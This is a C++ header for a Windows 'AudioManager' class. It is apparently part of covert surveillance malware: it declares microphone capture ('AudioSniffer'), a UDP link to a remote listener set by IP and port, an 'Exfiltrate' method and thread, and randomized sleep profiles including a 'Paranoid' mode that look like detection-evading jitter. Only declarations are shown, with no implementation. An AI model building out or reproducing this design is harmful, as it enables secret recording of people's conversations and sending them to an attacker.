#pragma once

// 1. THIS MUST BE FIRST
#define WIN32_LEAN_AND_MEAN 

// 2. Standard Windows headers
#include <windows.h>

// 3. Networking headers
#include <winsock2.h>
#include <ws2tcpip.h>

// 4. Multimedia headers
#include <mmdeviceapi.h>
#include <audioclient.h>

// 5. C++ Standard Library
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <random>
#include <iostream>
#include <algorithm>

// Tell the linker to include the Winsock library
#pragma comment(lib, "ws2_32.lib")

enum SleepProfile {
	Short = 0,
	Normal = 1,
	Long = 2,
	Paranoid = 3,
	ReallyRandom = 4
};

class AudioManager {
private:
	SOCKET udpSocket = INVALID_SOCKET;
	sockaddr_in serverAddr;
	bool socketInitialized = false;

public:
	std::vector<char> globalAudioBuffer;
	std::mutex bufferMutex;
	bool bRunning = true;
	std::thread sniffer, exfilThread;
	std::random_device rd;
	std::mt19937 gen{ rd() }; 
	std::uniform_real_distribution<float> dist{ 6.0f, 30.0f };


	IMMDeviceEnumerator* pEnumerator = NULL;
	IMMDevice* pDevice = NULL;
	IAudioClient* pAudioClient = NULL;
	IAudioCaptureClient* pCaptureClient = NULL;
	WAVEFORMATEX* pwfx = NULL;

	void AudioSniffer();
	void Exfiltrate();
	bool Initialize();
	void Release();
	void LaunchSnifferThread();
	void Start();
	void Stop();
	void SetSleepMode(int mode);
	void RandomSleep();
	void SetListener(std::string ip_address, int port);
};
